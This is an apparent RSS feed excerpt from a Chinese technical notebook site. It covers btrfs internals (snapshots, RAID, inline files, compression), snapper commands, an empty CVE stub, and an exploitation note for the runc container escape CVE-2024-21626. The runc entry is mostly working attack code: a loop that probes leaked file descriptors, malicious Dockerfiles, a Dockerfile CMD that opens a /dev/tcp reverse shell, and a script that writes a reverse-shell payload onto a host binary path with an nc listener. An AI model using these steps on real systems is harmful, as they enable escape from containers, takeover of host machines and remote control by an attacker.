<p>利用快照，管理员可以在时间点 T1  将数据库停止，对系统建立一个快照。这个过程一般只需要几秒钟，然后就可以立即重新恢复数据库服务。此后在任何时候，管理员都可以对快照的内容进行备份操作，而此时用户对数据库的修改不会影响快照中的内容。当备份完成，管理员便可以删除快照，释放磁盘空间。</p>
<p>快照一般是只读的，当系统支持可写快照，那么这种可写快照便被称为克隆。克隆技术也有很多应用。比如在一个系统中安装好基本的软件，然后为不同的用户做不同的克隆，每个用户使用自己的克隆而不会影响其他用户的磁盘空间。非常类似于虚拟机。</p>
<p>Btrfs 支持 snapshot 和 clone 。这个特性极大地增加了 btrfs 的使用范围，用户不需要购买和安装昂贵并且使用复杂的卷管理软件。下面简要介绍一下 btrfs 实现快照的基本原理。</p>
<p>如前所述 Btrfs 采用 COW 事务技术，从图 1-10 可以看到，COW 事务结束后，如果不删除原来的节点 A,C,E，那么 A,C,E,D,F 依然完整的表示着事务开始之前的文件系统。这就是 snapshot 实现的基本原理。</p>
<p>Btrfs 采用引用计数决定是否在事务 commit 之后删除原有节点。对每一个节点，btrfs  维护一个引用计数。当该节点被别的节点引用时，该计数加一，当该节点不再被别的节点引用时，该计数减一。当引用计数归零时，该节点被删除。对于普通的  Tree Root, 引用计数在创建时被加一，因为 Superblock 会引用这个 Root block  。很明显，初始情况下这棵树中的所有其他节点的引用计数都为一。当 COW 事务 commit 时，superblock 被修改指向新的 Root A ’’，原来 Root block A 的引用计数被减一，变为零，因此 A 节点被删除。 A 节点的删除会引发其子孙节点的引用计数也减一，图  1-10 中的 B，C 节点的引用计数因此也变成了 0，从而被删除。 D,E 节点在 COW 时，因为被 A  ’’所引用，计数器加一，因此计数器这时并未归零，从而没有被删除。</p>
<p>创建 Snapshot  时，btrfs 将的 Root A 节点复制到 sA，并将 sA 的引用计数设置为 2 。在事务 commit 的时候，sA  节点的引用计数不会归零，从而不会被删除，因此用户可以继续通过 Root sA 访问 snapshot 中的文件。</p>
<h3>图 8. Snapshot</h3>
<p></p>
<p><strong>软件 RAID</strong></p>
<p>RAID 技术有很多非常吸引人的特性，比如用户可以将多个廉价的 IDE 磁盘组合为 RAID0 阵列，从而变成了一个大容量的磁盘； RAID1 和更高级的 RAID 配置还提供了数据冗余保护，从而使得存储在磁盘中的数据更加安全。</p>
<p>Btrfs 很好的支持了软件 RAID，RAID 种类包括 RAID0,RAID1 和 RAID10.</p>
<p>Btrfs 缺省情况下对 metadata 进行 RAID1 保护。前面已经提及 btrfs 将设备空间划分为 chunk，一些 chunk 被配置为  metadata，即只存储 metadata 。对于这类 chunk，btrfs 将 chunk 分成两个条带，写 metadata  的时候，会同时写入两个条带内，从而实现对 metadata 的保护。</p>
<h3>其他特性</h3>
<p>Btrfs 主页上罗列的其他特性不容易分类，这些特性都是现代文件系统中比较先进的技术，能够提高文件系统的时间或空间效率。</p>
<p><strong>Delay allocation</strong></p>
<p>延迟分配技术能够减少磁盘碎片。在 Linux 内核中，为了提高效率，很多操作都会延迟。</p>
<p>在文件系统中，小块空间频繁的分配和释放会造成碎片。延迟分配是这样一种技术，当用户需要磁盘空间时，先将数据保存在内存中。并将磁盘分配需求发送给磁盘空间分配器，磁盘空间分配器并不立即分配真正的磁盘空间。只是记录下这个请求便返回。</p>
<p>磁盘空间分配请求可能很频繁，所以在延迟分配的一段时间内，磁盘分配器可以收到很多的分配请求，一些请求也许可以合并，一些请求在这段延迟期间甚至可能被取消。通过这样的“等待”，往往能够减少不必要的分配，也有可能将多个小的分配请求合并为一个大的请求，从而提高 IO 效率。</p>
<p><strong>Inline file</strong></p>
<p>系统中往往存在大量的小文件，比如几百个字节或者更小。如果为其分配单独的数据 block，便会引起内部碎片，浪费磁盘空间。 btrfs 将小文件的内容保存在元数据中，不再额外分配存放文件数据的磁盘块。改善了内部碎片问题，也增加了文件的访问效率。</p>
<h3>图 9. inline file</h3>
<p></p>
<p>上图显示了一个 BTree 的叶子节点。叶子中有两个 extent data item 元数据，分别用来表示文件 file1 和 file2 所使用的磁盘空间。</p>
<p>假设 file1 的大小仅为 15 个字节； file2 的大小为 1M 。如图所示，file2 采用普通的 extent 表示方法：extent2 元数据指向一段 extent，大小为 1M，其内容便是 file2 文件的内容。</p>
<p>而对于 file1， btrfs 会把其文件内容内嵌到元数据 extent1 中。如果不采用 inline file 技术。如虚线所示，extent1 指向一个最小的 extent，即一个 block，但 file1 有 15 个字节，其余的空间便成为了碎片空间。</p>
<p>采用 inline 技术，读取 file1 时只需要读取元数据 block，而无需先读取 extent1 这个元数据，再读取真正存放文件内容的 block，从而减少了磁盘 IO 。</p>
<p>得益于 inline file 技术，btrfs 处理小文件的效率非常高，也避免了磁盘碎片问题。</p>
<p><strong>目录索引 Directory index</strong></p>
<p>当一个目录下的文件数目巨大时，目录索引可以显著提高文件搜索时间。 Btrfs 本身采用 BTree 存储目录项，所以在给定目录下搜索文件的效率是非常高的。</p>
<p>然而，btrfs 使用 BTree 管理目录项的方式无法同时满足 readdir 的需求。 readdir 是 POSIX 标准  API，它要求返回指定目录下的所有文件，并且特别的，这些文件要按照 inode number 排序。而 btrfs 目录项插入 BTree 时的 Key 并不是 Inode number，而是根据文件名计算的一个 hash 值。这种方式在查找一个特定文件时非常高效，但却不适于  readdir 。为此，btrfs 在每次创建新的文件时，除了插入以 hash 值为 Key  的目录项外，还同时插入另外一种目录项索引，该目录项索引的 KEY 以 sequence number 作为 BTree 的键值。这个  sequence number 在每次创建新文件时线性增加。因为 Inode number 也是每次创建新文件时增加的，所以 sequence  number 和 inode number 的顺序相同。以这种 sequence number 作为 KEY 在 BTree  中查找便可以方便的得到一个以 inode number 排序的文件列表。</p>
<p>另外以 sequence number 排序的文件往往在磁盘上的位置也是相邻的，所以以 sequence number 为序访问大量文件会获得更好的 IO 效率。</p>
<p>压缩</p>
<p>大家都曾使用过 zip，winrar 等压缩软件，将一个大文件进行压缩可以有效节约磁盘空间。 Btrfs 内置了压缩功能。</p>
<p>通常人们认为将数据写入磁盘之前进行压缩会占用很多的 CPU 计算时间，必然降低文件系统的读写效率。但随着硬件技术的发展，CPU 处理时间和磁盘 IO 时间的差距不断加大。在某些情况下，花费一定的 CPU 时间和一些内存，但却能大大节约磁盘 IO 的数量，这反而能够增加整体的效率。</p>
<p>比如一个文件不经过压缩的情况下需要 100 次磁盘 IO 。但花费少量 CPU 时间进行压缩后，只需要 10 次磁盘 IO 就可以将压缩后的文件写入磁盘。在这种情况下，IO  效率反而提高了。当然，这取决于压缩率。目前 btrfs 采用 zlib 提供的 DEFALTE/INFLATE  算法进行压缩和解压。在将来，btrfs 应该可以支持更多的压缩算法，满足不同用户的不同需求。</p>
<p>目前 btrfs 的压缩特性还存在一些不足，当压缩使能后，整个文件系统下的所有文件都将被压缩，但用户可能需要更细粒度的控制，比如针对不同的目录采用不同的压缩算法，或者禁止压缩。我相信，btrfs 开发团队将在今后的版本中解决这个问题。</p>
<p>对于某些类型的文件，比如 jpeg 文件，已经无法再进行压缩。尝试对其压缩将纯粹浪费 CPU 。为此，当对某文件的若干个 block 压缩后发现压缩率不佳，btrfs 将不会再对文件的其余部分进行压缩操作。这个特性在某种程度上提高了文件系统的 IO 效率。</p>
<p>预分配</p>
<p>很多应用程序有预先分配磁盘空间的需要。他们可以通过 posix_fallocate 接口告诉文件系统在磁盘上预留一部分空间，但暂时并不写入数据。如果底层文件系统不支持  fallocate，那么应用程序只有使用 write 预先写一些无用信息以便为自己预留足够的磁盘空间。</p>
<p>由文件系统来支持预留空间更加有效，而且能够减少磁盘碎片，因为所有的空间都是一次分配，因而更有可能使用连续的空间。 Btrfs 支持 posix_fallocate 。</p>
<h3>总结</h3>
<p>至此，我们对 btrfs 的很多特性进行了较为详细的探讨，但 btrfs 能提供的特性却并不止这些。 btrfs 正处于试验开发阶段，还将有更多的特性。</p>
<p>Btrfs 也有一个重要的缺点，当 BTree 中某个节点出现错误时，文件系统将失去该节点之下的所有的文件信息。而 ext2/3 却避免了这种被称为”错误扩散”的问题。</p>
<p>但无论怎样，希望您和我一样，开始认同 btrfs 将是 Linux 未来最有希望的文件系统。</p>
]]></content:encoded>
    </item>
    <item>
      <title>Snapper玩转btrfs文件系统</title>
      <link>https://www.geekery.cn/note-book/Btrfs/Snapper%E7%8E%A9%E8%BD%ACbtrfs%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F.html</link>
      <guid>https://www.geekery.cn/note-book/Btrfs/Snapper%E7%8E%A9%E8%BD%ACbtrfs%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Snapper玩转btrfs文件系统</source>
      <description>Snapper玩转btrfs文件系统 https://zhuanlan.zhihu.com/p/31082518 配置 snapper 在 Btrfs 中，snapper 是以子卷为单位管理快照的。我们要先为子卷建立配置文件才能管理快照。 这里我们不另外划分子卷，直接以 Btrfs 挂载点的根目录来进行操作（根目录也算是一个子卷）。 4.1 创建配置文...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/31082518" target="_blank" rel="noopener noreferrer">https://zhuanlan.zhihu.com/p/31082518</a></p>
</blockquote>
<h2><strong>配置 snapper</strong></h2>
<p>在 Btrfs 中，snapper 是以子卷为单位管理快照的。我们要先为子卷建立配置文件才能管理快照。</p>
<p>这里我们不另外划分子卷，直接以 Btrfs 挂载点的根目录来进行操作（根目录也算是一个子卷）。</p>
<h3>4.1 创建配置文件</h3>
<p>命令基本用法</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>snapper -c &lt;配置名称&gt; create-config &lt;子卷路径&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>用法举例</p>
<p>创建 <code>/mnt/btrfs/</code> 的快照配置文件。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>snapper -c snap_test create-config /mnt/btrfs/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>4.2 删除配置文件</h3>
<p>命令基本用法</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>snapper -c &lt;配置名称&gt; delete-config</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>4.3 列出现有配置文件</h3>
<p>命令基本用法</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>snapper list-configs</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2><strong>五、快照的管理</strong></h2>
<h3>5.1 拍摄一个快照</h3>
<p>5.1.1 拍摄一个普通快照</p>
<p>命令基本用法</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>snapper -c &lt;配置名称&gt; create [选项]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>用法举例</p>
<p>在 <code>/mnt/btrfs/</code> 上拍摄一个快照，描述信息为 <code>kuaizhao1</code>，并打印其编号。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>snapper -c snap_test create --description=kuaizhao1 -p</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>**执行结果</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>5.1.2 拍摄一对快照</p>
<p>快照对中包含了 <code>pre</code> 快照和 <code>post</code> 两种类型的快照。</p>
<p>一个 <code>pre</code> 快照需要对应一个 <code>post</code> 快照。</p>
<p>一般在进行文件系统操作之前拍摄一个 <code>pre</code> 快照，在操作完成后再拍摄一个 <code>post</code> 快照。</p>
<p>快照对其实跟普通快照并没有什么本质上的区别，只是做个标记便于识别和管理而已。</p>
<p>命令基本用法</p>
<p>拍摄 <code>pre</code> 快照</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>snapper -c &lt;配置名称&gt; create -t pre [选项]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>拍摄 <code>post</code> 快照</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>snapper -c &lt;配置名称&gt; create -t post --pre-number=&lt;pre 快照编号&gt; [选项]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<blockquote>
<p><strong>说明</strong>
快照编号可通过执行 5.2 的命令来查看，下同。</p>
</blockquote>
<h3>5.2 列出所有快照</h3>
<p>命令基本用法</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>snapper -c &lt;配置名称&gt; list</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>用法举例</p>
<p>列出 <code>/mnt/btrfs/</code> 中的所有快照。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>snapper -c snap_test list</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>执行结果</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span># 前期：指快照对中 post 快照所对应的 pre 快照名</span></span>
<span class="line"><span># 清空：指清理算法</span></span>
<span class="line"><span></span></span>
<span class="line"><span>类型   | # | 前期 # | 日期                               | 用户 | 清空     | 描述      | 用户数据</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>CVE-2023-32233</title>
      <link>https://www.geekery.cn/note-book/CVE/CVE-2023-32233.html</link>
      <guid>https://www.geekery.cn/note-book/CVE/CVE-2023-32233.html</guid>
      <source url="https://www.geekery.cn/rss.xml">CVE-2023-32233</source>
      <description>CVE-2023-32233 :TODO</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>:TODO</p>
]]></content:encoded>
    </item>
    <item>
      <title>CVE-2024-21626利用场景</title>
      <link>https://www.geekery.cn/note-book/CVE/CVE-2024-21626%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF.html</link>
      <guid>https://www.geekery.cn/note-book/CVE/CVE-2024-21626%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF.html</guid>
      <source url="https://www.geekery.cn/rss.xml">CVE-2024-21626利用场景</source>
      <description>CVE-2024-21626利用场景 影响组件 runc是一个根据OCI规范，在Linux上生成和运行容器的命令行工具。runc的使用非常灵活，可以与各种容器工具和平台集成，如Docker、Kubernetes等。它支持多种容器格式，包括OCI规范定义的标准格式，以及其他格式如Docker镜像格式。作为开源项目，runc受到全球开发者社区的广泛参与和贡...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>影响组件</h2>
<p>runc是一个根据OCI规范，在Linux上生成和运行容器的命令行工具。runc的使用非常灵活，可以与各种容器工具和平台集成，如Docker、Kubernetes等。它支持多种容器格式，包括OCI规范定义的标准格式，以及其他格式如Docker镜像格式。作为开源项目，runc受到全球开发者社区的广泛参与和贡献，被广泛应用于生产环境中的容器化部署。</p>
<h2>漏洞描述</h2>
<p>近日，奇安信CERT监测到runc官方发布安全通告修复了<strong>runc容器逃逸漏洞(CVE-2024-21626)</strong>，由于runc存在内部文件描述符泄露，本地攻击者可以通过多种方式进行容器逃逸：</p>
<p>1、由于runc 内部意外地将包括宿主机 /sys/fs/cgroup 句柄的几个文件描述符泄漏到 runc init 中，攻击欺骗具有特权的用户执行恶意容器镜像，可以导致pid1 进程将在宿主机挂载命名空间中拥有一个工作目录，生成的进程可以访问整个宿主文件系统。</p>
<p>2、由于runc exec中同样存在文件描述符泄漏和工作目录验证不足。如果容器内的恶意进程知道某个管理进程将使用 --cwd 参数和给定路径调用 runc exec，便可以用符号链接将该路径替换为 /proc/self/fd/7/ 。一旦容器进程执行了容器镜像中的可执行文件，可以绕过PR_SET_DUMPABLE 保护，之后攻击者可以通过打开 /proc/$exec_pid/cwd 来访问主机文件系统。</p>
<p>3、可以通过将类似/proc/self/fd/7/../../../bin/bash的路径用作 process.args 二进制参数来覆盖主机二进制文件来改进攻击1、2。由于可以覆盖类似 /bin/bash的二进制文件，一旦特权用户在主机上执行目标二进制文件，攻击者就可以进行转移，以完全访问主机。</p>
<h2>爆出漏洞的fd脚本</h2>
<p>若哪个fd存在漏洞，则这个脚本会显示出来你宿主机的hostname，这个fd要记录下来填到下面的Dockerfile里</p>
<blockquote>
<p>https://github.com/Wall1e/CVE-2024-21626-POC/blob/main/poc.sh</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#! /bin/bash</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> i</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">4..20}</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">do</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /proc/self/fd/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ubuntu:20.04</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "cat /proc/self/cwd/../../../etc/hostname"</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">done</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>恶意Dockerfile</h2>
<div class="language-dockerfile line-numbers-mode" data-highlighter="shiki" data-ext="dockerfile" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-dockerfile"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">FROM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ubuntu:18.04</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WORKDIR</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> /proc/1/fd/7/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h2>构建Dockerfile</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dockerid</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   ../../../</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dockerid</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /proc/1/cwd/../../../../etc/hostname</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>反弹shell</h2>
<p>对于业务来说，给一个上面的恶意镜像</p>
<p>然后可以加一个CMD 反弹shell</p>
<div class="language-dockerfile line-numbers-mode" data-highlighter="shiki" data-ext="dockerfile" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-dockerfile"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">FROM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ubuntu:18.04</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WORKDIR</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> /proc/1/fd/7/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">CMD</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> /bin/bash -c </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'bash -i &gt;&amp;/dev/tcp/ip/8000 0&gt;&amp;1'</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>给宿主机植入shell</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">ip</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">hostname</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -I</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '{print $1}'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">port</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1337</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/proc/self/cwd/../../../../bin/bash.copy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;&lt; </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">#!/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">bash -i &gt;&amp; /dev/tcp/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0&gt;&amp;1</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># listen and wait for reverse shell</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -lvvp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1337</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>控制WROKERDIR</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">runc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --cwd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /proc/1/fd/7/</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> demo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ../../../../</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>有些产品可以指定 WROKERDIR 也就是 cwd 那么也受影响,可以关注一下启动时候的参数 能不能控制WROKERDIR</p>
]]></content:encoded>
    </item>
    <item>
      <title>CoreDNS使用Redis插件</title>
      <link>https://www.geekery.cn/note-book/CoreDNS/CoreDNS%E4%BD%BF%E7%94%A8Redis%E6%8F%92%E4%BB%B6.html</link>
